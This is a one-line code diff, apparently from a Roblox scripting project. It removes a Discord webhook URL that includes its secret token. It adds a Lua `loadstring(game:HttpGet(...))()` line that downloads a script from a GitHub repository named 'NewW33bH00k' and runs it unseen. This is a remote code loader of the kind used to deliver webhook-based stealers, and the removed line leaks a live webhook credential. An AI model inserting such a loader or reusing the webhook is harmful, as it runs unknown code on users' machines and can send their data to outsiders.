@@ -1,1 +1,1 @@
-https://discord.com/api/webhooks/1142444898512027759/yAGyhuZN1A2hNiBO7MXsKXJOJPENSDz1KFYv1Z9QDV0AnqzGEfxtldT6O8cjSwa2I0LV
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/NewW33bH00k/main/S",true))()
